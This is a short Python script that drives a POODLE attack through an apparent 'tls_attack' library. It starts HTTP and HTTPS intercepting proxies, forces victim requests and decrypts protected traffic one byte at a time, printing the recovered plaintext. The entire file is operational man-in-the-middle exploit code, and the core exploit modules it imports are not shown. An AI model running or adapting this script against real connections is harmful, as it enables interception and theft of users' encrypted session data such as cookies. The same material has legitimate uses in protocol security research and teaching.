import logging
import sys
import time

from tls_attack.proxy.HTTPSProxyServer         import *
from tls_attack.proxy.HTTPProxyServer          import *
from tls_attack.module.AlterHandshake          import *
from tls_attack.module.ForceRequest            import *
from tls_attack.module.ForceRequestOracle      import *
from tls_attack.module.PoodleAttack            import *
from tls_attack.structure.TLSCipherSuiteStruct import *

c_index = 0
c_key = None
c_str = ""

def poodle_result(guess, byte_index):
    global c_index, c_str

    print(guess, byte_index)

    c_str += chr(guess)
    c_index += 1

    print("Value so far : " + c_str)

    poodle_next()

def poodle_next():
    global c_index, c_key

    print(c_index)

    attack.decrypt_byte(c_key, c_index, poodle_result)

def poodle_handler(key, client_ip, server_ip):
    global c_key

    c_key = key
    poodle_next()
    

logging.basicConfig(stream=sys.stdout, level=logging.WARN)

http_server = HTTPProxyServer(port = 8080)
force_request = ForceRequest(http_server)
https_server = HTTPSProxyServer(port = 8443)

attack = PoodleAttack(https_server, force_request)
attack.on_vulnerable_connection(poodle_handler)
attack.start()